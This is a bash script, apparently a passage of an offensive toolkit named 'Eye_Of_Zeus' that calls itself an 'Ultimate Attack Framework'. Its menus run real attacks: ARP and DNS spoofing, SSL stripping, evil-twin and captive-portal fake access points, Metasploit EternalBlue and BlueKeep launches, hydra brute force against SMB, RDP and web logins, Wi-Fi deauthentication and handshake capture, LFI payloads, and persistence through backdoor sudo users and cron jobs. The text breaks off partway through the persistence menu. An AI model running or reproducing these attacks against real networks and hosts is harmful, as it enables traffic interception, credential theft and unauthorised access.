#!/bin/bash
# Base colors (Debian theme)
DEBIAN_RED="\e[1;31m"              # Classic red for errors
DEBIAN_BLUE="\e[38;2;0;83;159m"    # #00539f - Debian blue  
DEBIAN_GREEN="\e[38;2;0;166;156m"  # #00a69c - Debian green
DEBIAN_PURPLE="\e[38;2;119;33;111m" # #77216f - Debian purple
DEBIAN_ORANGE="\e[38;2;255;102;0m" # #ff6600 - Debian orange

# Hyprland-style accents (modern, vibrant)
HYPR_CYAN="\e[38;2;64;206;255m"    # #40ceff - Hyprland cyan
HYPR_MAGENTA="\e[38;2;187;63;231m" # #bb3fe7 - Hyprland magenta
HYPR_YELLOW="\e[38;2;255;206;64m"  # #ffce40 - Hyprland yellow
HYPR_PINK="\e[38;2;255;119;198m"   # #ff77c6 - Hyprland pink

# Gradient colors (for headers)
GRADIENT_BLUE="\e[38;2;0;180;255m"
GRADIENT_PURPLE="\e[38;2;147;0;211m"
GRADIENT_PINK="\e[38;2;255;20;147m"

# Text styles
BOLD="\e[1m"
RESET="\e[0m"

# ─────────────────────────────────────────────────────────────────────────────
# Interactive UI / animation helpers
# ─────────────────────────────────────────────────────────────────────────────

# Hide/show the cursor and always restore it on exit.
hide_cursor() { tput civis 2>/dev/null; }
show_cursor() { tput cnorm 2>/dev/null; }
trap 'show_cursor' EXIT

# Typewriter effect: prints text one char at a time.
# Usage: type_text "message" [color] [delay]
type_text() {
    local text="$1"
    local color="${2:-$HYPR_CYAN}"
    local delay="${3:-0.008}"
    echo -ne "$color$BOLD"
    local i
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep "$delay"
    done
    echo -e "$RESET"
}

# Braille spinner that runs while a background PID is alive.
# Usage: some_command & spin $! "Working..."
spin() {
    local pid="$1"
    local msg="${2:-Working...}"
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    hide_cursor
    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i + 1) % ${#frames[@]} ))
        echo -ne "\r${HYPR_MAGENTA}${BOLD}${frames[$i]}${RESET} ${HYPR_CYAN}${msg}${RESET} "
        sleep 0.08
    done
    wait "$pid" 2>/dev/null
    local rc=$?
    if [ $rc -eq 0 ]; then
        echo -e "\r${DEBIAN_GREEN}${BOLD}[✓]${RESET} ${msg}          "
    else
        echo -e "\r${DEBIAN_RED}${BOLD}[✗]${RESET} ${msg}          "
    fi
    show_cursor
    return $rc
}

# Animated progress/loading bar.
# Usage: loading_bar "Initializing" [total_steps] [step_delay]
loading_bar() {
    local label="${1:-Loading}"
    local steps="${2:-30}"
    local delay="${3:-0.02}"
    local filled bar i pct
    hide_cursor
    for (( i=0; i<=steps; i++ )); do
        pct=$(( i * 100 / steps ))
        filled=$(( i * 30 / steps ))
        bar=$(printf '█%.0s' $(seq 1 "$filled"))
        bar+=$(printf '░%.0s' $(seq 1 $(( 30 - filled )) ))
        echo -ne "\r${HYPR_YELLOW}${BOLD}${label}${RESET} ${GRADIENT_BLUE}[${bar}]${RESET} ${HYPR_PINK}${pct}%%${RESET}"
        sleep "$delay"
    done
    echo ""
    show_cursor
}

# Prints a menu line with a small left-pointer "gesture" for flair.
menu_item() {
    local num="$1" text="$2" color="${3:-$HYPR_CYAN}"
    echo -e "  ${GRADIENT_PINK}${BOLD}❯${RESET} ${color}${BOLD}${num})${RESET} ${color}${text}${RESET}"
}

# Return the interface of the primary default route (first match only).
default_iface() {
    ip route show default 2>/dev/null | awk '/default/ {print $5; exit}'
}

# Return the gateway IP of the primary default route (first match only).
default_gateway() {
    ip route show default 2>/dev/null | awk '/default/ {print $3; exit}'
}

# Function for modern headers
modern_header() {
    local text="$1"
    echo -e "\e[48;2;30;30;46m${BOLD}${HYPR_CYAN}"
    printf "╔════════════════════════════════════════════════════════════════════════════════╗\n"
    printf "║ %-72s ║\n" "$text"
    printf "╚════════════════════════════════════════════════════════════════════════════════╝\n"
    echo -e "${RESET}"
}

# Eye_Of_Zeus Banner with Cool Colors + power-on animation
banner() {
    clear
    # ASCII art revealed line-by-line for a subtle "power-on" sweep.
    local art=(
" ██████████                                  ███████       ██████            ███████████                            "
"░░███░░░░░█                                ███░░░░░███    ███░░███          ░█░░░░░░███                             "
" ░███  █ ░  █████ ████  ██████            ███     ░░███  ░███ ░░░           ░     ███░    ██████  █████ ████  █████ "
" ░██████   ░░███ ░███  ███░░███          ░███      ░███ ███████                  ███     ███░░███░░███ ░███  ███░░  "
" ░███░░█    ░███ ░███ ░███████           ░███      ░███ ░░░███░                 ███     ░███████  ░███ ░███ ░░█████ "
" ░███ ░   █ ░███ ░███ ░███░░░            ░░███     ███    ░███                ████     █░███░░░   ░███ ░███  ░░░░███"
" ██████████ ░░███████ ░░██████  █████████ ░░░███████░     █████     █████████ ███████████░░██████  ░░████████ ██████ "
"░░░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░░░░░    ░░░░░░░     ░░░░░     ░░░░░░░░░ ░░░░░░░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░░  "
"             ███ ░███                                                                                               "
"            ░░██████                                                                                                "
"             ░░░░░░                                                                                                 "
    )
    hide_cursor
    echo -ne "\e[38;2;64;206;255m"  # Hyprland Cyan
    local line
    for line in "${art[@]}"; do
        echo "$line"
        sleep 0.015
    done
    echo -e "\e[0m"
    show_cursor
    echo -e "\e[38;2;0;180;255m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;0;180;255m║             E Y E   O F   Z E U S  -  Ultimate Attack Framework               ║\e[0m"
    echo -e "\e[38;2;0;180;255m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo -e "\e[38;2;147;0;211m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;147;0;211m║                  Author: arch_nexus707 | Theme: Debian/Hyprland               ║\e[0m"
    echo -e "\e[38;2;147;0;211m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo -e "\e[38;2;255;20;147m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;255;20;147m║           For Professional Red Team Operations | Use Responsibly              ║\e[0m"
    echo -e "\e[38;2;255;20;147m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo ""
}

# Check root
check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${DEBIAN_RED}${BOLD}[✗] ERROR: This tool must be run as root${RESET}" >&2
        echo -e "${HYPR_YELLOW}${BOLD}[!] Try: sudo ./Eye_Of_Zeus_2.sh${RESET}"
        exit 1
    fi
}

# Dependencies check
check_dependencies() {
    echo -e "\n${HYPR_YELLOW}${BOLD}[🔄] Checking dependencies...${RESET}"
    # Map of "command:apt-package" so we probe the real binary but install the correct package.
    local deps=(
        "nmap:nmap"
        "bettercap:bettercap"
        "ettercap:ettercap-text-only"
        "tshark:tshark"
        "hydra:hydra"
        "msfconsole:metasploit-framework"
        "sslstrip:sslstrip"
        "dnsmasq:dnsmasq"
        "hostapd:hostapd"
        "macchanger:macchanger"
        "aircrack-ng:aircrack-ng"
        "reaver:reaver"
        "wireshark:wireshark"
        "curl:curl"
        "git:git"
        "python3:python3"
        "pip3:python3-pip"
    )
    local missing=()

    for entry in "${deps[@]}"; do
        local cmd="${entry%%:*}"
        local pkg="${entry##*:}"
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$pkg")
            echo -e "  ${DEBIAN_RED}✗${RESET} ${cmd} ${DEBIAN_RED}(pkg: ${pkg})${RESET}"
        else
            echo -e "  ${DEBIAN_GREEN}✓${RESET} ${cmd}"
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "\n${DEBIAN_RED}${BOLD}[!] Missing packages: ${missing[*]}${RESET}"
        echo -e "${HYPR_YELLOW}${BOLD}[*] Installing missing packages...${RESET}"
        apt-get update -qq & spin $! "Refreshing package lists"
        apt-get install -y "${missing[@]}" &>/dev/null & spin $! "Installing: ${missing[*]}"
        if [ $? -ne 0 ]; then
            echo -e "${DEBIAN_RED}${BOLD}[✗] Some packages failed to install. Install them manually and re-run.${RESET}"
        fi
    else
        echo -e "${DEBIAN_GREEN}${BOLD}[✓] All dependencies already installed${RESET}"
    fi

    # Install Python packages.
    # Modern Kali/Debian (PEP 668) block system-wide pip installs, so try the
    # Debian packages first, then fall back to pip with --break-system-packages.
    echo -e "\n${HYPR_YELLOW}${BOLD}[🔄] Checking Python packages...${RESET}"
    local py_pkgs=("python3-scapy" "python3-requests" "python3-bs4")
    if ! apt-get install -y "${py_pkgs[@]}" 2>/dev/null; then
        echo -e "${HYPR_YELLOW}${BOLD}[*] Falling back to pip (--break-system-packages)...${RESET}"
        if ! pip3 install --break-system-packages scapy requests beautifulsoup4; then
            echo -e "${DEBIAN_RED}${BOLD}[✗] Failed to install Python packages. Install scapy/requests/beautifulsoup4 manually.${RESET}"
        fi
    fi
    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Dependency check complete${RESET}"
}

# Network discovery
network_discovery() {
    banner
    modern_header "NETWORK DISCOVERY MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) Quick Scan (Ping Sweep)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) Deep Scan (OS + Services)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) ARP Scan (Local Network)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) WiFi Scan (AP Discovery)${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}5) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter network range (e.g., 192.168.1.0/24):${RESET}"
            read -r network
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting quick scan on $network...${RESET}"
            nmap -sn "$network" -oN "network_scan_$(date +%Y%m%d_%H%M%S).txt"
            ;;
        2)
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter network range (e.g., 192.168.1.0/24):${RESET}"
            read -r network
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting deep scan on $network...${RESET}"
            nmap -sS -sV -O -T4 "$network" -oN "deep_scan_$(date +%Y%m%d_%H%M%S).txt"
            ;;
        3)
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting ARP scan...${RESET}"
            arp-scan --localnet | tee "arp_scan_$(date +%Y%m%d_%H%M%S).txt"
            ;;
        4)
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Scanning for WiFi networks...${RESET}"
            nmcli dev wifi list | tee "wifi_scan_$(date +%Y%m%d_%H%M%S).txt"
            ;;
        5)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Advanced MITM attacks
mitm_attacks() {
    banner
    modern_header "MITM ATTACK MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) ARP Spoofing${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) DNS Spoofing${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Advanced SSL Stripping${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) Session Hijacking${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}5) Captive Portal${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}6) Evil Twin (WiFi)${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}7) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter gateway IP:${RESET}"
            read -r gateway
            local iface; iface="$(default_iface)"
            echo 1 > /proc/sys/net/ipv4/ip_forward
            arpspoof -i "$iface" -t "$target" "$gateway" &
            arpspoof -i "$iface" -t "$gateway" "$target" &
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] ARP spoofing started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'kill $(jobs -p) 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; trap - INT; return' INT
            sleep infinity
            ;;
        2)
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain to spoof (e.g., *.google.com):${RESET}"
            read -r domain
            bettercap -iface "$(default_iface)" -eval "set arp.spoof.targets $target; set dns.spoof.all true; set dns.spoof.domains $domain; arp.spoof on; dns.spoof on"
            ;;
        3)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Advanced SSL Stripping${RESET}"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter gateway IP:${RESET}"
            read -r gateway
            local iface; iface="$(default_iface)"
            echo 1 > /proc/sys/net/ipv4/ip_forward
            iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
            sslstrip -a -l 8080 &
            arpspoof -i "$iface" -t "$target" "$gateway" &
            arpspoof -i "$iface" -t "$gateway" "$target" &
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] SSL stripping started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'kill $(jobs -p) 2>/dev/null; iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; trap - INT; return' INT
            sleep infinity
            ;;
        4)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Session Hijacking${RESET}"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            ettercap -T -i "$(default_iface)" -M arp:remote "/$target//" "/$(default_gateway)//"
            ;;
        5)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Captive Portal Attack${RESET}"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
            read -r interface
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter SSID for fake AP:${RESET}"
            read -r ssid
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter redirect URL:${RESET}"
            read -r url

            echo "interface=$interface
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
server=8.8.8.8
address=/#/$url" > /tmp/dnsmasq.conf

            echo "interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > /tmp/hostapd.conf

            ip addr flush dev "$interface" 2>/dev/null
            ifconfig "$interface" 192.168.1.1 netmask 255.255.255.0 up
            dnsmasq -C /tmp/dnsmasq.conf -d &
            hostapd -B /tmp/hostapd.conf
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] Captive portal started on $ssid (Ctrl+C to stop and return to menu)${RESET}"
            trap 'pkill dnsmasq 2>/dev/null; pkill hostapd 2>/dev/null; ifconfig "$interface" down 2>/dev/null; trap - INT; return' INT
            sleep infinity
            ;;
        6)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Evil Twin Attack${RESET}"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target AP SSID:${RESET}"
            read -r target_ssid
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
            read -r interface
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter channel:${RESET}"
            read -r channel

            # Capture the real monitor interface name from airmon-ng output
            # (it is not always "<iface>mon").
            local mon_iface
            mon_iface="$(airmon-ng start "$interface" | grep -oE '(monitor mode.*enabled.*on \[?[a-z0-9]+\]?[a-z0-9]*|\[phy[0-9]+\][a-z0-9]+)' | grep -oE '[a-z0-9]+mon|[a-z0-9]+$' | tail -1)"
            [ -z "$mon_iface" ] && mon_iface="${interface}mon"

            # Terse nmcli output avoids backslash-escaped colons in the BSSID.
            local target_bssid
            target_bssid="$(nmcli -t -f BSSID,SSID dev wifi | grep -F ":$target_ssid" | head -1 | sed 's/\\//g' | cut -d: -f1-6)"

            airodump-ng -c "$channel" --bssid "$target_bssid" "$mon_iface" &
            local dump_pid=$!
            sleep 10
            kill "$dump_pid" 2>/dev/null

            echo "interface=$mon_iface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > /tmp/evil_twin.conf

            hostapd -B /tmp/evil_twin.conf
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] Evil Twin AP started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'pkill hostapd 2>/dev/null; airmon-ng stop "$mon_iface" 2>/dev/null; trap - INT; return' INT
            sleep infinity
            ;;
        7)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
}

# Exploitation module
exploitation() {
    banner
    modern_header "EXPLOITATION MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) SMB Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) RDP Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Web Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) WiFi Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}5) Zero-Day Exploits${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}6) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            banner
            modern_header "SMB EXPLOITATION"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "\n${HYPR_CYAN}${BOLD}1) EternalBlue (MS17-010)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) BlueKeep (CVE-2019-0708)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) SMBGhost (CVE-2020-0796)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching EternalBlue exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching BlueKeep exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                3)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching SMBGhost exploit...${RESET}"
                    python3 /usr/share/exploitdb/exploits/windows/remote/48537.py "$target"
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting SMB brute force...${RESET}"
                    hydra -l "$user" -P /usr/share/wordlists/rockyou.txt smb://"$target" -t 10
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        2)
            banner
            modern_header "RDP EXPLOITATION"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "\n${HYPR_CYAN}${BOLD}1) BlueKeep (CVE-2019-0708)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching BlueKeep exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting RDP brute force...${RESET}"
                    hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt rdp://"$target" -t 10
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        3)
            banner
            modern_header "WEB EXPLOITATION"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target URL:${RESET}"
            read -r url
            echo -e "\n${HYPR_CYAN}${BOLD}1) SQL Injection${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) XSS${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) LFI/RFI${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting SQL injection scan...${RESET}"
                    sqlmap -u "$url" --batch --level=5 --risk=3
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter XSS payload:${RESET}"
                    read -r payload
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Testing XSS payload...${RESET}"
                    curl -s "$url" --data-urlencode "input=$payload"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter LFI/RFI payload (e.g., ../../../../etc/passwd):${RESET}"
                    read -r payload
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Testing LFI/RFI...${RESET}"
                    curl -s "$url?page=$payload"
                    ;;
                4)
                    # hydra wants the host separately from the request path; a full
                    # URL as the target argument is rejected.
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target host or IP (e.g., 192.168.1.10):${RESET}"
                    read -r login_host
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter login path (e.g., /login.php):${RESET}"
                    read -r login_path
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter failure string shown on bad login (e.g., Invalid):${RESET}"
                    read -r fail_str
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting web brute force...${RESET}"
                    hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt "$login_host" http-post-form "${login_path}:username=^USER^&password=^PASS^:${fail_str}" -t 10
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        4)
            banner
            modern_header "WIFI EXPLOITATION"
            echo -e "${HYPR_CYAN}${BOLD}1) WPA Handshake Capture${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) PMKID Attack${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) WPS Attack${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Deauthentication Attack${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r wifi_choice

            case $wifi_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
                    read -r interface
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
                    read -r bssid
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target channel:${RESET}"
                    read -r channel
                    local mon_iface
                    mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                    [ -z "$mon_iface" ] && mon_iface="${interface}mon"
                    airodump-ng -c "$channel" --bssid "$bssid" -w "handshake" "$mon_iface" &
                    local dump_pid=$!
                    sleep 10
                    aireplay-ng -0 5 -a "$bssid" "$mon_iface"
                    sleep 10
                    kill "$dump_pid" 2>/dev/null
                    airmon-ng stop "$mon_iface"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Handshake captured. Use aircrack-ng to crack it.${RESET}"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
                    read -r interface
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
                    read -r bssid
                    # Restrict the capture to the chosen BSSID via a filter file.
                    echo "$bssid" > /tmp/eoz_pmkid_filter.txt
                    echo -e "${HYPR_YELLOW}${BOLD}[*] Capturing for 60s (Ctrl+C to stop early)...${RESET}"
                    timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --filterlist_ap=/tmp/eoz_pmkid_filter.txt --filtermode=2 2>/dev/null \
                        || hcxdumptool -i "$interface" -o "pmkid.pcapng" --enable_status=1
                    hcxpcapngtool -o "pmkid_hash" "pmkid.pcapng"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] PMKID saved to pmkid_hash. Use hashcat -m 22000 to crack it.${RESET}"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
                    read -r interface
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
                    read -r bssid
                    reaver -i "$interface" -b "$bssid" -vv
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
                    read -r interface
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
                    read -r bssid
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter client MAC (leave empty for broadcast):${RESET}"
                    read -r client
                    local mon_iface
                    mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                    [ -z "$mon_iface" ] && mon_iface="${interface}mon"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Deauth running (Ctrl+C to stop and restore card)${RESET}"
                    trap 'airmon-ng stop "$mon_iface" 2>/dev/null; trap - INT; return' INT
                    if [ -z "$client" ]; then
                        aireplay-ng -0 0 -a "$bssid" "$mon_iface"
                    else
                        aireplay-ng -0 0 -a "$bssid" -c "$client" "$mon_iface"
                    fi
                    airmon-ng stop "$mon_iface" 2>/dev/null
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        5)
            banner
            modern_header "ZERO-DAY EXPLOITATION"
            echo -e "${HYPR_CYAN}${BOLD}1) Search for exploits${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Run exploit${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r zero_choice

            case $zero_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter search term:${RESET}"
                    read -r search_term
                    searchsploit "$search_term"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter exploit path:${RESET}"
                    read -r exploit_path
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
                    read -r target
                    python3 "$exploit_path" "$target"
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        6)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Post-exploitation
post_exploitation() {
    banner
    modern_header "POST-EXPLOITATION MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) Persistence${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) Data Exfiltration${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Privilege Escalation${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) Lateral Movement${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}5) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            banner
            modern_header "PERSISTENCE"
            echo -e "${HYPR_CYAN}${BOLD}1) Add User${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Cron Job${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) Systemd Service${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Backdoor${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r persist_choice

            case $persist_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r username
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter password:${RESET}"
                    read -r password
                    useradd -m -p "$(openssl passwd -1 "$password")" -s /bin/bash "$username"
                    usermod -aG sudo "$username"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] User $username added with sudo privileges${RESET}"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter command to run:${RESET}"
                    read -r command
                    (crontab -l 2>/dev/null; echo "@reboot $command") | crontab -
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Cron job added${RESET}"
                    ;;
                3)
